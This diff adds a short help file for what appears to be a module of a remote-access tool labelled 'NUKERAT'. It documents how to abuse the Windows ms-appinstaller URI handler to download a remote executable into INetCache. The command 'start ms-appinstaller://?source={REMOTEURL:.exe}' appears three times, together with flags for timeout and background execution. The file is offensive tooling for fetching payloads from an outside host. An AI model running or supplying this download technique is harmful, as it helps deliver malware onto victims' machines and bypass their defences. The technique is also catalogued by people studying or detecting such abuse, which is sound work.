@@ -1,0 +1,18 @@
+ABOUT
+    Windows AppX/MSIX installer invoked via the ms-appinstaller URI
+    handler.
+    Spawns AppInstaller to fetch a package from a URL; downloaded
+    content lands in INetCache.
+
+USAGE:
+    start ms-appinstaller://?source={REMOTEURL:.exe}
+
+EXAMPLES:
+    start ms-appinstaller://?source={REMOTEURL:.exe}
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    start ms-appinstaller://?source={REMOTEURL:.exe}
